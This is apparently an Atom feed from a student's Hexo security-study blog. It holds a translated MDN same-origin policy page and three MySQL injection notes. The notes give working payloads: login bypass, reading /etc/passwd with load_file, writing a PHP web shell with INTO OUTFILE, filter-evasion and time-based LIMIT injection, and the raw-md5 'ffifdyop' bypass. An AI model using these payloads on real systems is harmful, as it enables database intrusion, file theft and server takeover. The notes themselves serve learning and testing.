<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Alisita&#39;s blogs</title>
  <subtitle>一只准备考研的苦逼学生</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://alisitaweb.github.io/"/>
  <updated>2017-09-16T04:00:56.112Z</updated>
  <id>https://alisitaweb.github.io/</id>
  
  <author>
    <name>yuanbo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浏览器同源策略</title>
    <link href="https://alisitaweb.github.io/2017/09/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>https://alisitaweb.github.io/2017/09/16/浏览器同源策略/</id>
    <published>2017-09-16T04:00:23.291Z</published>
    <updated>2017-09-16T04:00:56.112Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="external">原文链接</a></p>
<p>同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制</p>
<h3 id="一个源的定义"><a href="#一个源的定义" class="headerlink" title="一个源的定义"></a>一个源的定义</h3><p>如果协议，端口（如果指定了一个）和域名对于两个页面是相同的，则两个页面具有相同的源<br>下面给出了相对<a href="http://store.company.com/dir/page.html" target="_blank" rel="external">http://store.company.com/dir/page.html</a> 同源检测的示例</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>结果</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://store.company.com/dir2/other.html" target="_blank" rel="external">http://store.company.com/dir2/other.html</a></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td><a href="http://store.company.com/dir/inner/another.html" target="_blank" rel="external">http://store.company.com/dir/inner/another.html</a></td>
<td>True</td>
<td></td>
</tr>
<tr>
<td><a href="https://store.company.com/secure.html" target="_blank" rel="external">https://store.company.com/secure.html</a></td>
<td>False</td>
<td>不同协议（https和http）</td>
</tr>
<tr>
<td><a href="http://store.company.ocm:81/dir/etc.html" target="_blank" rel="external">http://store.company.ocm:81/dir/etc.html</a></td>
<td>False</td>
<td>不同端口（81和80）</td>
</tr>
<tr>
<td><a href="http://news.company.com/dir/other.html" target="_blank" rel="external">http://news.company.com/dir/other.html</a></td>
<td>False</td>
<td>不同域名（news和store）</td>
</tr>
</tbody>
</table>
<p>还有参考<a href="https://developer.mozilla.org/en-US/docs/Same-origin_policy_for_file:_URIs" target="_blank" rel="external">文件的源定义</a></p>
<h3 id="源的继承"><a href="#源的继承" class="headerlink" title="源的继承"></a>源的继承</h3><p>来自 about:blank 和 javascript:URL 的内容从加载URL的文档继承原始文档，因为URL本身不提供任何有关原点的信息。data:URLs 获得一个新的，空的安全上下文</p>
<p><strong>注意：</strong> 在Gecko 6.0 之前，如果用户在位置栏中输入data URLs,data URLs将继承当前浏览器窗口中网页的安全上下文。</p>
<p><strong>IE 例外</strong><br>当涉及到同源策略是，Internet Explorer有主要的两个例外</p>
<ul>
<li>授信范围：两个相互之间高度互信的域名，如公司域名，不遵守同源策略的限制</li>
<li>端口：IE未将端口号加入到同源策略的组成部分之中，因此 <a href="http://company.com:81/index.html" target="_blank" rel="external">http://company.com:81/index.html</a> 和 <a href="http://company.com/index.html" target="_blank" rel="external">http://company.com/index.html</a> 属于同源并且不受任何限制</li>
</ul>
<h3 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h3><p>页面可能会更改自己的来源，但有一些限制。脚本可以将 <code>document.domain</code> 的值设置为其当前域或其当前域的超级域，如果将其设置为其当前域的超级域，则较短的域将用于后续原始检查。<br>例如：假设文档中的一个脚本在 <a href="http://store.company.com/dir/other.html" target="_blank" rel="external">http://store.company.com/dir/other.html</a> 执行以下语句<br><code>document.domain = &quot;company.com&quot;;</code><br>这条语句执行之后，页面将会成功地通过对 <a href="http://company.com/dir/page.html" target="_blank" rel="external">http://company.com/dir/page.html</a> 的同源检测。同理，<code>compan.com</code> 不能设置 <code>document.domain</code> 为 <code>othercompany.com</code></p>
<p>浏览器单独保存端口号。任何的赋值操作，包括 <code>document.domain = document.domian</code>都会以 <code>null</code> 值覆盖掉原来的端口号，因此 <code>company.com:8080</code> 页面的脚本不能仅通过设置 <code>document.domain = &quot;company.com&quot;</code> 就是与 <code>company.com</code> 通信。赋值是必须带上端口号，以确保端口号不会为 <code>null</code></p>
<p><strong>注意：</strong> 使用document.domain允许子域安全访问其父域时，需要设置 document.domain 在父域和子域中具有相同的值，虽然这样做只是将父域设置回其原始值，不做的话可能会导致权限错误</p>
<h3 id="跨源网络访问"><a href="#跨源网络访问" class="headerlink" title="跨源网络访问"></a>跨源网络访问</h3><p>同源策略控制了不同源之间的交互，例如在使用XMLHTTPRequest或<img>标签时则会收到同源策略的约束，交互通常分为三类：</p>
<ul>
<li>通常允许进行跨域操作（Cross-orgin writers） 例如：链接（links）,重定向以及表单提交，特定少数的HTTP请求需要添加preflight</li>
<li>通常允许跨域资源嵌入（Cross-orgin embedding） </li>
<li>通常不允许跨域读操作（Cross-orgin reads）。但常可以通过内嵌资源来巧妙的进行读取访问 例如可以读取图片的高度和宽度，调用内嵌脚本的方法</li>
</ul>
<p>下面是可能嵌入跨源的资源的一些示例：</p>
<ul>
<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到</li>
<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>标签嵌入css，由于css的，css的跨域需要一个设置正确的Content-Type消息头，不同浏览器有不同的限制</li>
<li><code>&lt;img&gt;</code>嵌入图片。支持的图片格式包括PNG，JPEG，GIF，BMP，SVG</li>
<li><code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>嵌入多媒体资源</li>
<li><code>&lt;object&gt;</code>,<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>的插件</li>
<li><code>@font-face</code>引入的字体，一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）</li>
<li><code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>载入的任何资源，站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互</li>
</ul>
<h3 id="如何允许跨域访问"><a href="#如何允许跨域访问" class="headerlink" title="如何允许跨域访问"></a>如何允许跨域访问</h3><p>使用CORS允许跨源访问</p>
<h3 id="如何阻止跨源访问"><a href="#如何阻止跨源访问" class="headerlink" title="如何阻止跨源访问"></a>如何阻止跨源访问</h3><ul>
<li>阻止跨域写操作，只要检测请求中的一个不可测的标记（CSRF token）即可，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。必须使用这个标记来阻止页面的跨站读操作</li>
<li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息</li>
<li>阻止跨站嵌入，确保你得资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守Conten-Type消息头。例如，如果你在<code>&lt;script&gt;</code> 标签中嵌入HTML文档，浏览器仍将HTML解析为Javascrip</li>
</ul>
<h3 id="跨源脚本API访问"><a href="#跨源脚本API访问" class="headerlink" title="跨源脚本API访问"></a>跨源脚本API访问</h3><p>Javascript的APIs中，如 <code>iframe.contentWindow</code>,<code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间直接相互引用。当两个文档的源不同时，这些引用方式将对 Window 和 Location对象的访问添加限制。可以使用<code>window.postMessage</code> 作为替代方案，提供跨域文档间的通讯</p>
<h4 id="窗口："><a href="#窗口：" class="headerlink" title="窗口："></a>窗口：</h4><p>允许一下对窗口属性的跨源访问<br>Methods：<br>window.blur<br>window.close<br>window.focus<br>window.postMessage</p>
<p>Attributes<br>window.closed                只读<br>window.frames                只读<br>window.length                只读<br>window.location                读/写<br>window.opener                只读<br>window.parent                只读<br>window.self                        只读<br>window.top                        只读<br>window.window                只读</p>
<p>某些浏览器允许访问比规范允许的更多属性</p>
<h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>允许一下对位置属性的跨源访问：<br>Methods<br>location.replace</p>
<p>Attributes<br>URLUtils.href</p>
<p>某些浏览器允许访问比规范允许的更多属性</p>
<h3 id="跨源数据存储访问"><a href="#跨源数据存储访问" class="headerlink" title="跨源数据存储访问"></a>跨源数据存储访问</h3><p>存储在浏览器中的数据，如localStorage和IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p>
<p>window.name属性可以用来临时存储数据，可以跨域访问</p>
<p>Cookies使用不同的源定义方式。一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix）即可。Firefox和Chrome使用Public Suffix List决定一个域是否是一个公共后缀（public suffix）。不管使用哪个协议（HTTP/HTTPS）或端口号，浏览器都允许给定的域以及其任何子域名(sub-domains)来访问cookie。设置cookie时，你可以使用Domain，Path，Secure，和Http-Only标记来限定其访问性。读取cookie时，不会知晓它的出处。尽管使用安全的https连接，任何可见的cookie都是使用不安全的连接设置的</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;同源策略限制从
    
    </summary>
    
      <category term="XSS" scheme="https://alisitaweb.github.io/categories/XSS/"/>
    
    
      <category term="XSS" scheme="https://alisitaweb.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>基本MySQL注入攻击</title>
    <link href="https://alisitaweb.github.io/2017/09/13/%E5%9F%BA%E6%9C%ACMySQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>https://alisitaweb.github.io/2017/09/13/基本MySQL注入攻击/</id>
    <published>2017-09-13T09:28:58.549Z</published>
    <updated>2017-09-13T09:29:44.888Z</updated>
    
    <content type="html"><![CDATA[<h3 id="注入常用函数与字符"><a href="#注入常用函数与字符" class="headerlink" title="注入常用函数与字符"></a>注入常用函数与字符</h3><p>控制语句操作(select,case,if(),…) <a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">case用法</a><br>比较操作(=,like,mod(),…)<br>字符串的猜解操作(mid(),left(),rpad(),…)<br>字符串生成操作(0x61,hex(),conv()(使用conv[10-36],10,36)可以实现所有字符的表示))</p>
<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>下面的是MySQL中可以用到的注释符:</p>
<p>#,/<em>,–,;%00,–+,反引号（只能在语句尾使用,MySQL中的注释符）<br>examples:<br>`SELECT </em> FROM Users WHERE username = ‘’ OR 1=1 – -‘ AND password = ‘’;<br>SELECT * FROM Users WHERE id = ‘’ UNION SELECT 1, 2, 3`’;</p>
<p>其他的常规的就不写了。。。</p>
<h3 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h3><p>在MySQL中，存在一个称为secure_file_priv的全局变量，该变量用于限制数据的导入和导出操作，例如:<code>select ... into outfile</code>语句和LOAD_FILE()<br>如果secure_file_priv变量为空那么直接可以使用函数，如果为NULL是不能使用<br>本来应该默认为NULL的，但是不知道为什么我的wamp里的默认为空。。。</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>读文件LOAD_FILE()<br>Examples:<br><code>select load_file(&#39;/etc/passwd&#39;);</code><br><code>select load_file(0x272f6574632f70617373776427);</code><br>注意点：<br>load_file的默认目录是@@datadir<br>文件必须是当前用户可读<br>读文件最大的为1047552个byte,@@max_allowed_packet可以查看文件读取最大值</p>
<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>INTO OUTFILE/DUMPFILE<br>经典写文件例子:<br><code>select &#39;&lt;? system($_GET[\&#39;c\&#39;]); ?&gt; INTO OUTFILE &#39;/var/www/shell.php&#39;;</code><br>INTO OUTFILE 写文件时会在每一行的结束自动加上换行符<br>INTO DUMPFILE 写文件时会保证原生内容，这种适用于二进制文件<br>有一个文章讲，<a href="http://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="external">写文件讲解</a><br>注意点：<br>INTO OUTFILE不会覆盖文件<br>INTO OUTFILE必须是查询语句的最后一句<br>路径名是不能编码的，必须使用单引号</p>
<h3 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h3><p>带外通道攻击主要是利用其它协议或者渠道从服务器提取数据，它可能是HTTP(s)请求，DNS解析服务，SMB服务，Mail服务等</p>
<h4 id="条件限制"><a href="#条件限制" class="headerlink" title="条件限制"></a>条件限制</h4><p>这些函数是要绝对路径的<br>如果securre_file_priv变量为空那么可以直接使用函数，如果为NULL是不能使用</p>
<h4 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h4><p>这个没搞明白，先搁起来</p>
<h4 id="SMB-Relay-注入攻击"><a href="#SMB-Relay-注入攻击" class="headerlink" title="SMB Relay 注入攻击"></a>SMB Relay 注入攻击</h4><p>解释一下SMB Relay<br>假设有主机B与A<br>1.A向B发起连接请求<br>2.B向A发送挑战（一组随机数据，8字节）<br>3.A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>4.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;注入常用函数与字符&quot;&gt;&lt;a href=&quot;#注入常用函数与字符&quot; class=&quot;headerlink&quot; title=&quot;注入常用函数与字符&quot;&gt;&lt;/a&gt;注入常用函数与字符&lt;/h3&gt;&lt;p&gt;控制语句操作(select,case,if(),…) &lt;a href=&quot;http:/
    
    </summary>
    
      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
    
    
      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 一些注入技巧</title>
    <link href="https://alisitaweb.github.io/2017/09/07/MySQL-%E4%B8%80%E4%BA%9B%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"/>
    <id>https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/</id>
    <published>2017-09-07T06:29:07.000Z</published>
    <updated>2017-09-07T06:30:13.366Z</updated>
    
    <content type="html"><![CDATA[<h3 id="总结一下mysql中用的到的技巧"><a href="#总结一下mysql中用的到的技巧" class="headerlink" title="总结一下mysql中用的到的技巧"></a>总结一下mysql中用的到的技巧</h3><hr>
<p><strong>常量</strong>：true，false，null，\N，current_timestamp变量：@myvar:=1</p>
<p><strong>系统变量</strong>：@@version,@@datadir…..</p>
<p><strong>常用函数</strong>：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring()</p>
<p><strong>字符串生成</strong>：hex(),conv()(数字进制转换)</p>
<p><strong>有关于字符串生成的</strong>：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6….</p>
<hr>
<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p> <em>空格</em>：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  </p>
<p> <em>and，or</em>：||，&amp;&amp; </p>
<p> <em>union select</em>：<br> 利用括号，’and(true)like(false)union(select(pass)from(users))，<br> 方括号union [all|distinct] select pass from users#，  union%a0select pass from users，<br> 或者内联注释union/<em>&amp;sort=</em>/select pass from users#  </p>
<p> <em>union</em>：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))  </p>
<p> <em>having</em>：and(select substr(group_concat(pass),1,1)from users)=’a  </p>
<p> <em>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)</em>：<br>select [all|distinct] pass from users  select<code>table_name</code>from<code>information_schema</code> . <code>tables</code><br>select pass as alias from users  select pass aliasalias from users<br>select pass<code>alias alias</code>from users  select+pass%a0from(users)  </p>
<p> <em>select,and,&amp;</em>：  这里就是可以利用上一篇文章中提到的false注入的方式进行绕过，具体见上文</p>
<p> <em>不使用逗号</em>：’ and substr(data from 1 for 1) = ‘a’#</p>
<h3 id="不同情境的注入技巧"><a href="#不同情境的注入技巧" class="headerlink" title="不同情境的注入技巧"></a>不同情境的注入技巧</h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p> 有时候可以利用一些逻辑语句进行注入<br> <code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>  limit后面可以跟两个函数，PROCEDURE 和 INTO（需要写权限）<br>  利用PROCEDURE 有两种方式，基于报错和时间，参考文章<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">MySQL下Limit注入方法</a><br>  5.6以上好像不行了QAQ。。。。。<br>  基于报错<br>  <code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
<p>  基于时间<br>  <code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p> order by 后面的数字也可以作为一个注入点，参考文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">MySQL Order By 注入总结</a><br> 这里就不多写了</p>
<h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><h5 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h5><p> <code>lpad(data,1,space(1))  // lpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;??hi&#39;</code><br> <code>rpad(data,1,space(1)) // rpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;hi??&#39;</code></p>
<h5 id="搜索匹配类的函数"><a href="#搜索匹配类的函数" class="headerlink" title="搜索匹配类的函数"></a>搜索匹配类的函数</h5><p> <code>&#39;-if(locate(&#39;f&#39;,data),1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;fo&#39;,data)1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;foo&#39;,data),1,0)#&#39;</code><br> <code>instr()</code><br> <code>position()</code></p>
<h5 id="使用函数进行字符串切割"><a href="#使用函数进行字符串切割" class="headerlink" title="使用函数进行字符串切割"></a>使用函数进行字符串切割</h5><p><code>length(trim(leading &#39;a&#39; from data))</code><br><code>length(replace(data,&#39;a&#39;,&#39;&#39;))</code></p>
<h4 id="关于PHP中md5的一个姿势"><a href="#关于PHP中md5的一个姿势" class="headerlink" title="关于PHP中md5的一个姿势"></a>关于PHP中md5的一个姿势</h4><p>例如，PHP中有这么一段SQL语句<br><code>$sql = &quot;select * from admin where pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>这里是可以注入的，关于PHP中md5函数<br>如果可选的raw_output被设置为TRUE，那么md5报文摘要将以16字节长度的原始二进制返回<br><strong>就是说找到一个字符串md5的二进制和字符编码中的某些编码对上，就会产生注入，这里贴出一个原文作者找到的字符串，ffifdyop,md5加密后对应的字符串是 <code>&#39;or&#39;&lt;trash&gt;</code></strong><br><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">原文</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;a href=&quot;#总结一下mysql中用的到的技巧&quot; class=&quot;headerlink&quot; title=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;/a&gt;总结一下mysql中用的到的技巧&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;常
    
    </summary>
    
      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
    
    
      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>MySQL False 注入姿势学习</title>
    <link href="https://alisitaweb.github.io/2017/09/06/MySQL-False%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>https://alisitaweb.github.io/2017/09/06/MySQL-False注入姿势学习/</id>
    <published>2017-09-06T13:43:32.552Z</published>
    <updated>2017-09-06T13:54:40.879Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">原文链接</a></p>
<h3 id="0x01-False-Injection"><a href="#0x01-False-Injection" class="headerlink" title="0x01 False Injection"></a>0x01 False Injection</h3><p>首先是看了文章之后知道了一个MySQL的特性<br>    <code>select * from user where username=0;</code><br>    <img src="./images/1.png" alt="enter description here" title="1"></p>
<p>这条语句指向之后会返回所有值</p>
<p>   <code>select * from users where password=0;</code><br>   <img src="./images/2.png" alt="enter description here" title="2"></p>
<p> 这里涉及到了MySQL的隐式类型转换</p>
<p>  官方文档是这样写的：<br>      <em>The following rules describe how conversion occurs for comparison operations:</em></p>
<p><em>If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.</em></p>
<p><em>If both arguments in a comparison operation are strings, they are compared as strings.</em></p>
<p><em>If both arguments are integers, they are compared as integers.</em></p>
<p><em>Hexadecimal values are treated as binary strings if not compared to a number.</em></p>
<p><em>If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.</em></p>
<p><em>If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.</em></p>
<p><em>In all other cases, the arguments are compared as floating-point (real) numbers</em></p>
<hr>
<p>大概意思就是：<br>    如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换</p>
<p>   两个参数都是字符串，按照字符串比较。不做类型转换</p>
<p>   两个参数都是整数，按照整数比较。不做类型转换</p>
<p>   如果不与数字进行比较，则将十六进制值视为二进制字符串。</p>
<p>   有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</p>
<p>   有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</p>
<p>   所有其他情况下，两个参数都会被转换为浮点数再进行比较</p>
<p>最重要的是下面这句话，这是利用点：<br>    <strong>字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</strong></p>
<p>那么，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串的开头是数字的时候会从数字部分截断，转换为数字，所以上面为什么会返回所有值就可以理解了。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>where username=&#39;&#39;+&#39;&#39;;</code><br><code>where username=&#39;&#39;-&#39;&#39;;</code><br><code>where username=&#39;&#39;*&#39;&#39;;</code><br><code>where username=&#39;&#39;/6;</code><br><code>where username=&#39;&#39;%1;</code><br><code>where username=&#39;&#39;&amp;0;</code><br><code>where username=&#39;&#39;|0;</code><br><code>where username=&#39;&#39;^0;</code></p>
<h6 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h6><p><code>&lt;&lt;0# &#39;&gt;&gt;0</code></p>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><code>where username=&#39;&#39;=0&lt;=&gt;1;</code><br><code>where username=&#39;&#39;=0&lt;&gt;0;</code><br><code>where username=&#39;&#39;&gt;-1;</code></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null#  &#39;in(-1,1)#  &#39;not in(1,0)#  &#39;like 1#  &#39;REGEXP 1#  &#39;BETWEEN 1 AND 1#  &#39;div 1#  &#39;xor 1#  &#39;=round(0,1)=&#39;1  &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/learning/detail/3804.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-False-Injection&quot;&gt;&lt;a href
    
    </summary>
    
      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
    
    
      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>new article</title>
    <link href="https://alisitaweb.github.io/2017/09/05/new-article/"/>
    <id>https://alisitaweb.github.io/2017/09/05/new-article/</id>
    <published>2017-09-05T09:02:39.000Z</published>
    <updated>2017-09-05T09:02:39.457Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Test</title>
    <link href="https://alisitaweb.github.io/2017/09/05/hello-world/"/>
    <id>https://alisitaweb.github.io/2017/09/05/hello-world/</id>
    <published>2017-09-05T02:26:15.920Z</published>
    <updated>2017-09-05T09:03:45.103Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
  </entry>
  
</feed>
